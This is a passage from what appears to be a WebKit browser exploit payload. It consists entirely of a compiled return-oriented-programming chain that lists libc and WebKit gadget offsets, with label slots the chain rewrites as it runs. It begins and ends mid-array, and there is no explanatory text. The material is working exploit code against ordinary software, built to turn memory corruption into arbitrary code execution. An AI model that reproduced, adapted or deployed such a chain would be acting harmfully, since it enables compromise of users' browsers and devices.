webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78008, //L307
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L307:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L309:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+78168, //L312
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78136, //L310
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+78152, //L311
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L310:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L311:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L312:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+78240, //L313
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L313:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+78296, //L315
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L315:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+78376, //L317
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L317:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L319:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+78496, //L322
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78480, //L320
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L320:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L322:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+78664, //L325
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+78680, //L326
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78648, //L323
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+78632, //L324
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L324:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L323:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L325:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L326:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+78784, //L327
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+78816, //L329
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+78800, //L328
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L327:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L328:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+78904, //L330
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+78960, //L332
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L332:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+79096, //L335
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79112, //L336
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+79080, //L334
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L334:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L335:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+79272, //L340
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+79224, //L338
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79256, //L339
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L338:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L337:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L339:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+79328, //L342
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L342:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+79432, //L344
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79464, //L345
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79448, //L343
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L344:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L343:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L345:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+79624, //L349
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79576, //L347
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79608, //L348
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L347:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L346:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L348:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L349:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+79680, //L351
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L351:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+79784, //L353
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79816, //L354
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79800, //L352
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L353:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L352:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+79976, //L358
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79928, //L356
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79960, //L357
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L356:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L355:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L357:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+80032, //L360
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L360:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+80136, //L362
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80168, //L363
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80152, //L361
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L362:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L361:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80240, //L364
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80256, //L365
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L364:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L365:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80416, //L369
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+80368, //L367
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80400, //L368
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L367:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L366:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L368:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+80472, //L371
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L371:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+80576, //L373
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80608, //L374
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80592, //L372
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L373:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L372:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80704, //L376
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80688, //L375
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L375:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L376:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+80784, //L377
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L377:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L379:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+80904, //L382
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+80888, //L380
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L380:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L382:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+81048, //L385
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81016, //L383
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+81032, //L384
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L383:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L384:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L385:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+81120, //L386
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L386:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+81176, //L388
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L388:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L390:
db([7, 0]); // 0x7
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+81304, //L391
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L391:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L393:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+81424, //L396
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81408, //L394
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L394:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L396:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+81592, //L399
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81608, //L400
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81576, //L397
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+81560, //L398
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L398:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L397:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L399:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+81712, //L401
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81744, //L403
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+81728, //L402
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L401:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L402:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+81848, //L404
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81864, //L405
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L404:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+81952, //L406
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+82008, //L408
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L408:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+82080, //L410
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L410:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+82136, //L412
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L412:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+82224, //L414
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L414:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L416:
db([4294967283, 4294967295]); // -0xd
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+82344, //L419
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+82328, //L417
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L417:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+82504, //L423
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+82456, //L421
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+82488, //L422
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L421:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L420:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L422:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L423:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+82560, //L425
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+82664, //L427
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+82696, //L428
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+82680, //L426
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L427:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L426:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L428:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+82856, //L432
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+82808, //L430
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+82840, //L431
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L430:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L429:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L431:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+82912, //L434
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L434:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+83016, //L436
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83048, //L437
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83032, //L435
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L436:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L435:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L437:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83120, //L438
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83136, //L439
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L438:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L439:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83296, //L443
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+83248, //L441
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83280, //L442
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L441:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L440:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L442:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+83352, //L445
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L445:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+83456, //L447
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83488, //L448
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83472, //L446
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L447:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L446:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L448:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83584, //L450
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83568, //L449
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L449:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L450:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+83664, //L451
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L451:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L453:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+83784, //L456
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+83768, //L454
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L454:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L456:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+83928, //L459
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+83896, //L457
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+83912, //L458
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L457:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L458:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L459:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+84000, //L460
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+84056, //L462
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L462:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+84136, //L464
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L464:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L466:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+84256, //L469
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+84240, //L467
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L467:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+84424, //L472
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
